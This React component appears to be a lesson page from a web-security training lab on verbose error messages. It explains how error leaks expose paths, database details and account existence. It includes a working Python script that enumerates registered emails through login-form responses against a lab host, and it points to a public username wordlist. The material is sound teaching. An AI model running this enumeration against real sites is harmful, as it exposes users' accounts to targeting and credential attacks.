import { useState, useEffect } from "react";
import { fetchProgress, submitAnswer } from "@/api/fetchProgress";
import UsernameDoesNotExist from "@/assets/username-does-not-exist.png";
import InvalidPassword from "@/assets/invalid-password.png";
import UsernameList from "@/assets/username-lists.png";



type Props = {
  userId: string;
};

const VerboseErrors = ({ userId }: Props) => {
  const [answer, setAnswer] = useState("");
  const [feedback, setFeedback] = useState<string | null>(null);
  const [completed, setCompleted] = useState(false);
  const [buttonColor, setButtonColor] = useState("bg-blue-500 hover:bg-blue-700");

  useEffect(() => {
    fetchProgress().then((progress) => {
      if (progress["VerboseErrors"]?.completed) {
        setCompleted(true);
        setButtonColor("bg-green-500");
      }
    });
  }, [userId]);

  const handleSubmit = async () => {
    const result = await submitAnswer(userId, "VerboseErrors", answer);
    if (result.correct) {
      setCompleted(true);
      setButtonColor("bg-green-500");
      setFeedback(null);
    } else {
      setButtonColor("bg-red-500 hover:bg-red-700");
      setFeedback("❌ Incorrect answer! Try again.");
      setTimeout(() => setButtonColor("bg-blue-500 hover:bg-blue-700"), 2000);
    }
  };

  return (
    <div className="p-6 bg-gray-900 text-white rounded-md">
      <h2 className="text-2xl font-bold mb-4">Understanding Verbose Errors</h2>

      <p className="mb-4">
        Think of verbose errors as unintended clues in a conversation meant to be private. During software development, they
        help engineers pinpoint bugs, but in production, they can expose details about the system’s inner workings. For someone
        with malicious intent, these messages can be just as useful as they are to developers—offering direct insight into backend logic, infrastructure, and data.
      </p>

      <p className="mb-4">
        If left unfiltered, these messages can disclose more than just a simple failure—they may expose configuration paths,
        user account states, database internals, or even suggest how different components interact behind the scenes.
      </p>

      <h3 className="text-xl font-semibold mb-2">What Can Verbose Errors Reveal?</h3>
      <p className="mb-4">
        When not properly sanitized, verbose error messages can unintentionally leak sensitive information such as:
      </p>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li>
          <strong>File and Directory Paths:</strong> Errors that include stack traces or file references can uncover server-side
          directory structures, internal script names, or configuration files that should remain hidden.
        </li>
        <li>
          <strong>Database Information:</strong> Messages may reference specific tables, columns, or database types—giving
          attackers insight into how to craft more effective injection payloads.
        </li>
        <li>
          <strong>User-Related Data:</strong> Login or form errors that differentiate between user states (e.g., “User not found”
          vs. “Incorrect password”) reveal which accounts actually exist.
        </li>
      </ul>

      <h3 className="text-xl font-semibold mb-2">How Attackers Force Systems to Disclose Verbose Errors</h3>
      <p className="mb-4">
        To take advantage of these verbose outputs, attackers often deliberately provoke failure states using common exploitation
        techniques such as:
      </p>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li>
          <strong>Invalid Login Attempts:</strong> Systems that return different messages based on whether a username exists
          allow attackers to confirm valid users without accessing any accounts.
        </li>
        <li>
          <strong>SQL Injection:</strong> Submitting malformed SQL input—like a stray single quote—can lead to database errors
          that expose schema-level details or query logic.
        </li>
        <li>
          <strong>File Inclusion/Traversal:</strong> Using input like <code>../../</code> may trigger errors revealing path
          structures or forbidden file access attempts.
        </li>
        <li>
          <strong>Form Manipulation:</strong> Modifying client-side parameters or hidden fields may lead to backend errors
          that reveal expected formats or system behavior.
        </li>
        <li>
          <strong>Application Fuzzing:</strong> Tools such as Burp Suite Intruder can automate the discovery of input values
          that trigger rich error responses, helping attackers discover vulnerable endpoints.
        </li>
      </ul>

      <h3 className="text-xl font-semibold mb-2">Enumeration Through Authentication Forms</h3>
      <p className="mb-4">
        We can also enumerate usernames in login forms. For example navigate to http://localhost:3000 and put any username in the email input field. For demonstration purposes, we have decided that the username consist of 6 letters with a possible combination of a-z, A-Z and 0-9. If an invalid username is sent, the website will respond with "username does not exist", which indicates that the username has not been registered yet.
      </p>

      <img
        src={UsernameDoesNotExist}
        alt="Example of 'username does not exist' message"
        className="rounded shadow-md mb-6"
      />

      <p className="mb-4">
      However, if the email is already registered, the website will respond with an "Invalid password" error message, indicating that the email exists in the database but the password is incorrect.
      </p>

      <img
        src={InvalidPassword}
        alt="Example of 'Invalid Password' message"
        className="rounded shadow-md mb-6"
      />

      <h3 className="text-xl font-semibold mb-2">Automation with Python</h3>
      <p className="mb-4">
        Here’s a Python script that automates enumeration by observing how a web app responds to different email inputs. It
        distinguishes between valid and invalid entries by analyzing error message content:
      </p>

      <div className="bg-gray-800 p-4 rounded-md mb-4 overflow-x-auto">
        <pre className="text-green-300 text-sm whitespace-pre-wrap">
{`import requests
import sys

def send_login_attempt(user_email):
    target_url = 'http://enum.thm/labs/verbose_login/functions.php'
    request_headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    payload = {
        'username': user_email,
        'password': 'dummy_pass',
        'function': 'login'
    }

    try:
        res = requests.post(target_url, headers=request_headers, data=payload)
        return res.json()
    except requests.RequestException as err:
        print(f"[!] Error communicating with server: {err}")
        return {}

def scan_emails(file_path):
    discovered = []
    not_found_msg = "Email does not exist"

    try:
        with open(file_path, 'r') as f:
            candidates = f.readlines()
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        sys.exit(1)

    for entry in candidates:
        email_candidate = entry.strip()
        if not email_candidate:
            continue
        result = send_login_attempt(email_candidate)
        if result.get('status') == 'error' and not_found_msg in result.get('message', ''):
            print(f"[-] Not Found: {email_candidate}")
        else:
            print(f"[+] Found: {email_candidate}")
            discovered.append(email_candidate)

    return discovered

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <path_to_email_list>")
        sys.exit(1)

    email_list_path = sys.argv[1]
    valid_list = scan_emails(email_list_path)

    print("\n[+] Valid emails:")
    for address in valid_list:
        print(address)
`}
        </pre>
      </div>

      <p className="mb-4">
        This script sends login requests using email addresses from a file. If the system responds with an error like
        "Email does not exist," it's marked invalid. Any other message is taken as a sign the email is registered—
        a clear example of user enumeration through verbose feedback.
      </p>

      <p className="mb-4">
       We can find a common list of emails for example from this repository: 
       https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt
      </p>

      <img
        src={UsernameList}
        alt="List of usernames"
        className="rounded shadow-md mb-6"
      />

      <p className="mb-4">
      Download the userlist in the Attackbox. Then create and execute the python script:
      </p>
      

      <h3 className="text-xl font-semibold mb-2">Answer the Question</h3>
      <p className="mb-4">What is the valid email address from the list?</p>

      <div className="flex items-center space-x-2">
        <input
          type="text"
          value={answer}
          onChange={(e) => setAnswer(e.target.value)}
          className="flex-1 p-2 bg-gray-700 text-white rounded-md border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
          placeholder="Enter your answer here"
        />
        <button
          onClick={handleSubmit}
          className={`p-2 px-4 rounded-md font-bold text-white transition-all ${buttonColor}`}
        >
          Submit
        </button>
      </div>

      {feedback && <p className="mt-2 text-red-400">{feedback}</p>}
      {completed && <p className="mt-4 text-green-400 font-bold">✅ Task Completed!</p>}
    </div>
  );
};

export default VerboseErrors;
